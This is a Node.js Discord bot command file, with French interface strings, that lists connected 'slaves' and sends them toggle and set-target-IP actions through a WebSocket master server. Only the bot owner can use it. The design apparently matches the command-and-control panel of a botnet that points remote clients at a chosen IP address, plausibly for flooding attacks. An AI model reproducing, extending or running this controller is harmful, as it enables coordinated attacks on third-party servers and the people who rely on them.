const { SlashCommandBuilder } = require('discord.js');
const { getSlaves, sendToSlave, sendToAllSlaves } = require('../ws/masterServer');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('shroom')
        .setDescription('Gestion des slaves')
        .addSubcommand(sub =>
            sub.setName('sendtoall')
               .setDescription('Envoyer une action à tous les slaves')
               .addStringOption(opt =>
                   opt.setName('action')
                      .setDescription('Action à exécuter')
                      .setRequired(true)
                      .addChoices(
                          { name: 'Toggle', value: 'toggle' },
                          { name: 'Set Target', value: 'setTarget' }
                      ))
               .addStringOption(opt =>
                   opt.setName('value')
                      .setDescription('Valeur pour l’action (ex: true/false pour toggle ou nouvelle IP pour setTarget)')
                      .setRequired(false)))
        .addSubcommand(sub =>
            sub.setName('sendtoone')
               .setDescription('Envoyer une action à un seul slave')
               .addStringOption(opt =>
                   opt.setName('uuid')
                      .setDescription('UUID du slave')
                      .setRequired(true))
               .addStringOption(opt =>
                   opt.setName('action')
                      .setDescription('Action à exécuter')
                      .setRequired(true)
                      .addChoices(
                          { name: 'Toggle', value: 'toggle' },
                          { name: 'Set Target', value: 'setTarget' }
                      ))
               .addStringOption(opt =>
                   opt.setName('value')
                      .setDescription('Valeur pour l’action (ex: true/false pour toggle ou nouvelle IP pour setTarget)')
                      .setRequired(false)))
        .addSubcommand(sub =>
            sub.setName('ls')
               .setDescription('Liste les slaves connectés')),
    async execute(interaction) {
        const OWNER_ID = `${process.env.BOT_OWNER}`;
        if (interaction.user.id !== OWNER_ID) return;

        const sub = interaction.options.getSubcommand();

        if (sub === 'ls') {
            const slaves = getSlaves();
            await interaction.reply(`Slaves connectés: ${slaves.join(', ') || 'aucun'}`);
            return;
        }

        const action = interaction.options.getString('action');
        const value = interaction.options.getString('value');

        if (action === 'setTarget' && !value) {
            await interaction.reply({ content: 'Erreur : Vous devez fournir une IP pour setTarget', ephemeral: true });
            return;
        }

        const payload = action === 'toggle'
            ? { action, value: value === 'true' ? true : value === 'false' ? false : undefined }
            : { action, server: value };

        if (sub === 'sendtoone') {
            const uuid = interaction.options.getString('uuid');
            sendToSlave(uuid, JSON.stringify(payload));
            await interaction.reply(`Action "${action}" envoyée à ${uuid}`);
        } else if (sub === 'sendtoall') {
            sendToAllSlaves(JSON.stringify(payload));
            await interaction.reply(`Action "${action}" envoyée à tous les slaves`);
        }
    }
};
